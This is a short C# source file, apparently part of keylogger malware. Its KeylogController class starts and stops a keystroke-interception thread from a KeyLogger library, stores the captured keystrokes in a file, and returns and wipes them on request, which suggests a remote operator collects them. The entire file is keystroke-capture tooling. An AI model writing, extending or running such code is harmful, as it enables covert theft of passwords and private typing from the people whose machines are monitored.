using KeyLogger;

class KeylogController
{
    private Thread worker;
    private CancellationTokenSource cts;

    public void Start()
    {
        cts = new CancellationTokenSource();
        worker = new Thread(() => Run(cts.Token));

        worker.Start();
        File.WriteAllText(appstart.path, "");
    }

    private void Run(CancellationToken token)
    {
        KeyLogger.InterceptKeys.startKLog();
    }

    public void Stop()
    {
        Console.WriteLine("STOP");
        KeyLogger.InterceptKeys.stopKLog();
        cts.Cancel();

        if (worker != null && worker.IsAlive)
        {
            worker.Join(1000); // Wait up to 1 second
        }
    }

    public string PrintKeys()
    {
        string s = File.Exists(appstart.path)
            ? File.ReadAllText(appstart.path)
            : "";

        File.WriteAllText(appstart.path, "");

        if (string.IsNullOrEmpty(s))
            s = "\0";

        return s;
    }
}